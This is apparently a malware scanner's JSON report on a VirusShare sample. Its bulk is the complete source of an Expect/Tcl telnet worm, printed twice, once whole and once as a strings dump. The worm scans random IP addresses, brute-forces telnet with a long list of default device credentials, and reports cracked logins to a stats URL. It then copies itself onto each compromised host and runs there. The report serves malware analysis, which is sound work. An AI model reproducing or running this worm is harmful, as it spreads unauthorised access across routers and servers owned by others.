{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "open": "May open a file",
            "write": "May write to a file"
        },
        "macro": "#!/usr/bin/expect\n# TCLWORM v1.0\n# by sirius_black\n# http://membres.lycos.fr/lotfree\n\nif {[fork]!=0} exit\ndisconnect\n\nset wget_found 0\nset telnet_found 0\nset wget_path \"\"\nset telnet_path \"\"\n\nset liste_telnet {\n    \"\" \"\"\n    admin 1234\n    admin admin\n    admin \"default\"\n    administrator \"\"\n    Administrator \"\"\n    admin \"\"\n    admin \"switch\"\n    admin synnet\n    adm \"\"\n    bbsd-client changeme2\n    bbsd-client NULL\n    cablecom router\n    chochete tiabuena\n    debug d.e.b.u.g\n    debug synnet\n    diag \"switch\"\n    D-Link D-Link\n    dream trocse\n    echo echo\n    guest guest\n    login admin\n    LUCENT01 UI-PSWD-01\n    LUCENT02 UI-PSWD-02\n    manager friend\n    manager manager\n    Manager Manager\n    Manager \"\"\n    monitor monitor\n    #n/a 1234\n    #n/a 14admin\n    #n/a admin\n    #n/a adtran\n    #n/a ascend\n    #n/a BRIDGE\n    #n/a cisco\n    #n/a NetICs\n    #n/a \"\"\n    #n/a orinoco\n    #n/a password\n    #n/a PASSWORD\n    #n/a secret\n    #n/a secure\n    #n/a \"Serial Number\"\n    #n/a speedxess\n    #n/a telos\n    #netopia netopia\n    \"\" 1234\n    \"\" access\n    \"\" netadmin\n    \"\" \"\"\n    \"\" root\n    operator admin\n    operator \"\"\n    read synnet\n    root administrator\n    root \"default\"\n    !root \"\"\n    root \"\"\n    root par0t\n    root pass\n    root QNX\n    root root\n    root tini\n    security security\n    service smile\n    setup \"\"\n    sysadm anicust\n    sysadm sysadm\n    tech \"\"\n    tech tech\n    Telnet \"\"\n    test test\n    User \"\"\n    write \"private\"\n    write synnet\n}\n\nset liste_cisco {\n    \"\" \"\"\n    admin admin\n    admin \"default\"\n    Administrator changeme\n    bbsd-client changeme2\n    bbsd-client NULL\n    cisco cisco\n    enable cisco\n    #n/a \"\"\n    #n/a admin\n    #n/a c\n    #n/a cc\n    #n/a cisco\n    #n/a \"Cisco routeur\"\n    #n/a letmein\n    netrangr attack\n    ripeop \"\"\n    root attack\n}\n\nproc get_random_ip {} {\n    set tcl_precision 3\n    set ip \"\"\n    append ip [expr round((rand()*1000)/4)]\n    for {set i 0} {$i < 3} {incr i 1} {\n\tappend ip \".\"\n\tappend ip [expr round((rand()*1000)/4)]\n    }\n    return $ip\n}\n\nproc is_telnet_open ip {\n    set is_open 0\n    if { [catch {set sock [socket $ip 23]} ] } {\n\tset is_open 0\n    } else {\n\tset is_open 1\n\tclose $sock\n    }\n    return $is_open\n}\n\nproc where_are_progs {} {\n    global wget_found\n    global telnet_found\n    global wget_path\n    global telnet_path\n    if [file exists \"/usr/bin/wget\"]==1 {\n\tset wget_found 1\n\tset wget_path \"/usr/bin/wget\"\n    }\n    if [file exists \"/usr/bin/telnet\"]==1 {\n\tset telnet_found 1\n\tset telnet_path \"/usr/bin/telnet\"\n    }\n}\n\nproc whereis_worm {} {\n    set worm_path [pwd]\n    set file_name [lindex [split [info script] \"/\"] end]\n    append worm_path \"/\" $file_name\n    return $worm_path\n}\n\nproc get_content {} {\n    set f [open [whereis_worm] \"r\"]\n    set texte \"\"\n    while { ![eof $f] } {\n\tset ligne [gets $f]\n\tset ligne [string map {\\\\ \\\\\\\\ \\$ \\\\\\$ \\` \\\\\\`} $ligne]\n\tset ligne [string trim $ligne]\n\tappend texte \"$ligne\\n\"\n    }\n    close $f\n    return $texte\n}\n\nproc MyIpaddr {} {\n    set addr \"\"\n    if {[catch {dns address [info hostname]} addr]} {\n        set server [socket -server # 0]\n\tset port [lindex [fconfigure $server -sockname] 2]\n\tset host [lindex [fconfigure $server -sockname] 1]\n\tset client [socket $host $port]\n        set addr [lindex [fconfigure $client -sockname] 0]\n        close $client\n        close $server\n    }\n    return $addr\n}\n\nproc MyNet {} {\n    set net \"\"\n    regexp {(.*)\\..*} [MyIpaddr] {} net\n    return $net\n}\n\nproc declare_becane {ip login password} {\n    set lheaders \"Connection close\"\n    if {![llength [info commands \"::http::geturl\"]]} {\n\tif {[catch {package require http}]} {\n\t    return \"zut\"\n\t}\n    }\n    ::http::config -useragent \"TCLWORM v1.0 (LOTFREE)\"\n    set htmlUrl \"http://localhost:3128/wormstat.php?ip=$ip&login=$login&pass=$password\"\n    if { [catch { ::http::geturl $htmlUrl} token]} {\n\treturn \"zut\"\n    }\n    if { [::http::status $token] != \"ok\"} {\n\treturn \"zut\"\n    }\n    set htmlFile [::http::data $token]\n    if { [regexp \"haxored\" $htmlFile] == 1 } {\n\treturn \"next\"\n    }\n    return \"go\"\n}\n\nwhere_are_progs\n\nset ip \"\"\nwhile {1==1} {\n    set ip [get_random_ip]\n    if { [regexp \"^127\" $ip] == 1 } {\n\tcontinue\n    }\n    if { ![is_telnet_open $ip] } {\n\tcontinue\n    } else {\n\tif {$telnet_found == 1} {\n\t    #on utilise telnet\n\t    foreach {login passwd} $liste_telnet {\n\t\tspawn -noecho $telnet_path $ip 23\n\t\texpect {\n\t\t    \"ogin:\" { send \"$login\\n\" }\n\t\t    \"user:\" { send \"$login\\n\" }\n\t\t    \"imeout\" { continue }\n\t\t    \"ailure\" { continue }\n\t\t    \"nknow host\" { continue }\n\t\t    \"o route to host\" { continue }\n\t\t    \"o adresse associated with name\" { continue }\n\t\t}\n\t\texpect {\n\t\t    \"incorrect\" { continue }\n\t\t    \"ssword:\" { send \"$passwd\\n\" }\n\t\t}\n\t\texpect {\n\t\t    \"ast login:\" {\n\t\t\tif { [declare_becane $ip $login $passwd] == \"next\" } {\n\t\t\tsend \"logout\\nexit\\n\"\n\t\t\t    continue\n\t\t\t} else {\n\t\t\t    exec sleep 2\n\t\t\t    send \"cat > tclworm << EOF\\n\"\n\t\t\t    expect \">\"\n\t\t\t    send [get_content]\n\t\t\t    expect \">\"\n\t\t\t    send \"EOF\\n\"\n\t\t\t    expect \"$\"\n\t\t\t    send \"chmod +x tclworm\\n\"\n\t\t\t    expect \"$\"\n\t\t\t    send \"./tclworm\\n\"\n\t\t\t    expect \"$\"\n\t\t\t    send \"logout\\nexit\\n\"\n\t\t\t    #continue\n\t\t\t}\n\t\t    }\n\t\t}\n\t    }\n\t}\n\t# fin de on utilise telnet\n\tcontinue\n    }\n}"
    },
    "filename": "VirusShare_4a0a3988582baa1d3d0f5289b97d34f4",
    "filesize": 5245,
    "filetype": "a /usr/bin/expect script, ASCII text executable",
    "hashes": {
        "md5": "4a0a3988582baa1d3d0f5289b97d34f4",
        "sha1": "f1d7faadbdbda1ea2ffdbd91cbf2e977a28ec4f2",
        "sha256": "7ff82630fda0f984542e4c853225e12a37db39b3d685008209d3cd8cef684cef"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/expect",
            "# TCLWORM v1.0",
            "# by sirius_black",
            "# http://membres.lycos.fr/lotfree",
            "if {[fork]!=0} exit",
            "disconnect",
            "set wget_found 0",
            "set telnet_found 0",
            "set wget_path \"\"",
            "set telnet_path \"\"",
            "set liste_telnet {",
            "    \"\" \"\"",
            "    admin 1234",
            "    admin admin",
            "    admin \"default\"",
            "    administrator \"\"",
            "    Administrator \"\"",
            "    admin \"\"",
            "    admin \"switch\"",
            "    admin synnet",
            "    adm \"\"",
            "    bbsd-client changeme2",
            "    bbsd-client NULL",
            "    cablecom router",
            "    chochete tiabuena",
            "    debug d.e.b.u.g",
            "    debug synnet",
            "    diag \"switch\"",
            "    D-Link D-Link",
            "    dream trocse",
            "    echo echo",
            "    guest guest",
            "    login admin",
            "    LUCENT01 UI-PSWD-01",
            "    LUCENT02 UI-PSWD-02",
            "    manager friend",
            "    manager manager",
            "    Manager Manager",
            "    Manager \"\"",
            "    monitor monitor",
            "    #n/a 1234",
            "    #n/a 14admin",
            "    #n/a admin",
            "    #n/a adtran",
            "    #n/a ascend",
            "    #n/a BRIDGE",
            "    #n/a cisco",
            "    #n/a NetICs",
            "    #n/a \"\"",
            "    #n/a orinoco",
            "    #n/a password",
            "    #n/a PASSWORD",
            "    #n/a secret",
            "    #n/a secure",
            "    #n/a \"Serial Number\"",
            "    #n/a speedxess",
            "    #n/a telos",
            "    #netopia netopia",
            "    \"\" 1234",
            "    \"\" access",
            "    \"\" netadmin",
            "    \"\" \"\"",
            "    \"\" root",
            "    operator admin",
            "    operator \"\"",
            "    read synnet",
            "    root administrator",
            "    root \"default\"",
            "    !root \"\"",
            "    root \"\"",
            "    root par0t",
            "    root pass",
            "    root QNX",
            "    root root",
            "    root tini",
            "    security security",
            "    service smile",
            "    setup \"\"",
            "    sysadm anicust",
            "    sysadm sysadm",
            "    tech \"\"",
            "    tech tech",
            "    Telnet \"\"",
            "    test test",
            "    User \"\"",
            "    write \"private\"",
            "    write synnet",
            "set liste_cisco {",
            "    \"\" \"\"",
            "    admin admin",
            "    admin \"default\"",
            "    Administrator changeme",
            "    bbsd-client changeme2",
            "    bbsd-client NULL",
            "    cisco cisco",
            "    enable cisco",
            "    #n/a \"\"",
            "    #n/a admin",
            "    #n/a c",
            "    #n/a cc",
            "    #n/a cisco",
            "    #n/a \"Cisco routeur\"",
            "    #n/a letmein",
            "    netrangr attack",
            "    ripeop \"\"",
            "    root attack",
            "proc get_random_ip {} {",
            "    set tcl_precision 3",
            "    set ip \"\"",
            "    append ip [expr round((rand()*1000)/4)]",
            "    for {set i 0} {$i < 3} {incr i 1} {",
            "\tappend ip \".\"",
            "\tappend ip [expr round((rand()*1000)/4)]",
            "    }",
            "    return $ip",
            "proc is_telnet_open ip {",
            "    set is_open 0",
            "    if { [catch {set sock [socket $ip 23]} ] } {",
            "\tset is_open 0",
            "    } else {",
            "\tset is_open 1",
            "\tclose $sock",
            "    }",
            "    return $is_open",
            "proc where_are_progs {} {",
            "    global wget_found",
            "    global telnet_found",
            "    global wget_path",
            "    global telnet_path",
            "    if [file exists \"/usr/bin/wget\"]==1 {",
            "\tset wget_found 1",
            "\tset wget_path \"/usr/bin/wget\"",
            "    }",
            "    if [file exists \"/usr/bin/telnet\"]==1 {",
            "\tset telnet_found 1",
            "\tset telnet_path \"/usr/bin/telnet\"",
            "    }",
            "proc whereis_worm {} {",
            "    set worm_path [pwd]",
            "    set file_name [lindex [split [info script] \"/\"] end]",
            "    append worm_path \"/\" $file_name",
            "    return $worm_path",
            "proc get_content {} {",
            "    set f [open [whereis_worm] \"r\"]",
            "    set texte \"\"",
            "    while { ![eof $f] } {",
            "\tset ligne [gets $f]",
            "\tset ligne [string map {\\\\ \\\\\\\\ \\$ \\\\\\$ \\` \\\\\\`} $ligne]",
            "\tset ligne [string trim $ligne]",
            "\tappend texte \"$ligne\\n\"",
            "    }",
            "    close $f",
            "    return $texte",
            "proc MyIpaddr {} {",
            "    set addr \"\"",
            "    if {[catch {dns address [info hostname]} addr]} {",
            "        set server [socket -server # 0]",
            "\tset port [lindex [fconfigure $server -sockname] 2]",
            "\tset host [lindex [fconfigure $server -sockname] 1]",
            "\tset client [socket $host $port]",
            "        set addr [lindex [fconfigure $client -sockname] 0]",
            "        close $client",
            "        close $server",
            "    }",
            "    return $addr",
            "proc MyNet {} {",
            "    set net \"\"",
            "    regexp {(.*)\\..*} [MyIpaddr] {} net",
            "    return $net",
            "proc declare_becane {ip login password} {",
            "    set lheaders \"Connection close\"",
            "    if {![llength [info commands \"::http::geturl\"]]} {",
            "\tif {[catch {package require http}]} {",
            "\t    return \"zut\"",
            "    }",
            "    ::http::config -useragent \"TCLWORM v1.0 (LOTFREE)\"",
            "    set htmlUrl \"http://localhost:3128/wormstat.php?ip=$ip&login=$login&pass=$password\"",
            "    if { [catch { ::http::geturl $htmlUrl} token]} {",
            "\treturn \"zut\"",
            "    }",
            "    if { [::http::status $token] != \"ok\"} {",
            "\treturn \"zut\"",
            "    }",
            "    set htmlFile [::http::data $token]",
            "    if { [regexp \"haxored\" $htmlFile] == 1 } {",
            "\treturn \"next\"",
            "    }",
            "    return \"go\"",
            "where_are_progs",
            "set ip \"\"",
            "while {1==1} {",
            "    set ip [get_random_ip]",
            "    if { [regexp \"^127\" $ip] == 1 } {",
            "\tcontinue",
            "    }",
            "    if { ![is_telnet_open $ip] } {",
            "\tcontinue",
            "    } else {",
            "\tif {$telnet_found == 1} {",
            "\t    #on utilise telnet",
            "\t    foreach {login passwd} $liste_telnet {",
            "\t\tspawn -noecho $telnet_path $ip 23",
            "\t\texpect {",
            "\t\t    \"ogin:\" { send \"$login\\n\" }",
            "\t\t    \"user:\" { send \"$login\\n\" }",
            "\t\t    \"imeout\" { continue }",
            "\t\t    \"ailure\" { continue }",
            "\t\t    \"nknow host\" { continue }",
            "\t\t    \"o route to host\" { continue }",
            "\t\t    \"o adresse associated with name\" { continue }",
            "\t\texpect {",
            "\t\t    \"incorrect\" { continue }",
            "\t\t    \"ssword:\" { send \"$passwd\\n\" }",
            "\t\texpect {",
            "\t\t    \"ast login:\" {",
            "\t\t\tif { [declare_becane $ip $login $passwd] == \"next\" } {",
            "\t\t\tsend \"logout\\nexit\\n\"",
            "\t\t\t    continue",
            "\t\t\t} else {",
            "\t\t\t    exec sleep 2",
            "\t\t\t    send \"cat > tclworm << EOF\\n\"",
            "\t\t\t    expect \">\"",
            "\t\t\t    send [get_content]",
            "\t\t\t    expect \">\"",
            "\t\t\t    send \"EOF\\n\"",
            "\t\t\t    expect \"$\"",
            "\t\t\t    send \"chmod +x tclworm\\n\"",
            "\t\t\t    expect \"$\"",
            "\t\t\t    send \"./tclworm\\n\"",
            "\t\t\t    expect \"$\"",
            "\t\t\t    send \"logout\\nexit\\n\"",
            "\t\t\t    #continue",
            "\t\t\t}",
            "\t\t    }",
            "\t    }",
            "\t# fin de on utilise telnet",
            "\tcontinue",
            "    }"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "set wget_found 0",
                "set wget_path \"\"",
                "    global wget_found",
                "    global wget_path",
                "    if [file exists \"/usr/bin/wget\"]==1 {",
                "\tset wget_found 1",
                "\tset wget_path \"/usr/bin/wget\""
            ]
        },
        "ip": [],
        "url": [
            "http://localhost:3128/wormstat.php?ip=ip&login=login&pass=password",
            "http://membres.lycos.fr/lotfree"
        ]
    },
    "time": "0:00:00.281888",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
